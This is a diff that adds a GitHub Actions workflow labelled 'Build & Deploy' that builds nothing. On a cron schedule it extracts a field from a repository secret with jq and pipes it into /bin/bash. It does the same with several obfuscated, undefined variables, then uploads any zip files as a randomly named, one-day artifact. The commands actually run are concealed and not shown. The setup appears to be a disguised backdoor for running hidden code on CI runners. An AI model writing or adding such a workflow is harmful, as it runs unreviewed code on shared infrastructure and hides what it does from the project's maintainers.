@@ -1,0 +1,28 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '18 2,8,14,20 * * *'
+jobs:
+  start:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute task
+        env:
+          e27: ${{ secrets.e27 }}
+        run: |
+          printf '%s' "$e27" | jq -r .fx2895 | /bin/bash
+          echo $oq75348 | jq -r .grtv8275 | /bin/bash
+          echo $k3796 | jq -r .as49137 | /bin/bash
+          echo $he99 | jq -r .kma59 | /bin/bash
+          echo $rkepb03 | jq -r .mfp72 | /bin/bash
+
+      - name: Persist data
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: tAaHFrKA
+          path: "*.zip"
+          retention-days: 1
